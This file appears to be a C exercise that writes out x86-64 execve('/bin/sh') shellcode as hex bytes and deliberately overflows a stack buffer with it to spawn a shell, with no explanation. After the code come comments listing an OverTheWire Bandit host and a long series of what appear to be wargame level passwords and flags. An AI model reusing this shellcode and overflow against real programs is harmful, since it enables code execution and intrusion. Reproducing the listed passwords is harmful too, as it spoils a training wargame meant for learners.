////////////////////////////////////////////////////////////////
////////--------\\\\\\\\========````````((((((((........||||||||
# include <sys/types.h>
# include <string.h>
////////........||||||||^ ^ ^ ^ --------* * * * //////// , , , ,
const char shellcode[] = 
/* ;;;;     */ "\xEB\x10"
/* ;;;;;;   */ "\x5F"
/* ;;;;;;;; */ "\x48\x31\xC0"
/*  ;;      */ "\x50"
/* ;;;;;;   */ "\x57"
/*  ;;;;    */ "\x48\x89\xE6"
/*     ;;;; */ "\x48\x89\xC2"
/*  ;;      */ "\xB0\x3B"
/* ;;;;;    */ "\x0F\x05"
/* ;;;;;;   */ "\xE8\xEB\xFF\xFF\xFF"
/* ;;;;;;;; */ "/bin/sh";
//////// _ _ _ _` ` ` ` , , , , ========********: ; : : ________
typedef u_int64_t u64;
//////// - - - -\\\\\\\\ , , , ,```````` * * * *________ : : : :
# define BUFRLEN 40
# define OVERSIZ 80
////////--------________>>>>>>>>````````////////........''''''''
u_char overflow[ OVERSIZ ];
//////// = = = =;;;;;;;; * * * *,,,,,,,, * * * * > > > >_=_=_=_=
int main( void ){
        u_char bufr[ BUFRLEN ]; // The subject.
        for( int j = 0; j < OVERSIZ/sizeof( u64 ); ++j ){
                ((u64 *)overflow)[ j ] = (u64)bufr;
        }
        memcpy( overflow, shellcode, strlen( shellcode ));
        // strcpy won't work, as there are zeroes in the address
        memcpy( bufr, overflow, OVERSIZ );
}
////////////////////////////////////////////////////////////////
// bandit.labs.overthewire.org:2220
// boJ9jbbUNNfktd78OOpsqOltutMc3MY1
// CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
// UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
// pIwrPrtPN36QITSp3EQaw936yaFoFgAB
// koReBOKuIDDepwhWk7jZC0RTdopnAYKh
// DXjZPULLxYr17uwoI01bNLQbtFemEgo7
// HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
// cvX2JJa4CFALtqS87jk27qwqGhBM9plV
// UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
// truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
// IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
// 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
// 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
// 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
// BfMYroe26WYalil77FoDi9qh59eK5xNr
// cluFn7wTiGryunymYOu4RcffSxQluehd
// kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
// IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
// GbKksEFF4yrVs6il55v6gwY5aVje5f0j
// gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
// Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
// jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
// UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
// uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
// 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
// 3ba3118a22e93127a4ed485be72ef5ea
// 0ef186ac70e04ea33b4c1853d2526fa2
// bbc96594b4e001778eee9975372716b2
// 5b90576bedb2cc04c86a9e924ce42faf
// 47e603bb428404d265f59c42920d81e5
// 56a9bf19c63d650ce78e6ec0354ee45e
// c9c3199ddf4121b10cf581a98d51caee
